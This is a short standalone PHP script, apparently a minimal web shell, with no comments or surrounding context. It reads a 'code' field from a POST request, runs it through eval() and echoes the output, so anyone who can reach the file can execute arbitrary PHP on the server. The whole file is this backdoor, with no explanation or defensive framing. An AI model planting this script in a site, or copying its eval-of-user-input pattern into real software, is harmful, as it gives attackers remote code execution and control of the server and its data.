

<?php

    $code = $_POST['code'];
    $output = eval($code);
    echo $output;

?>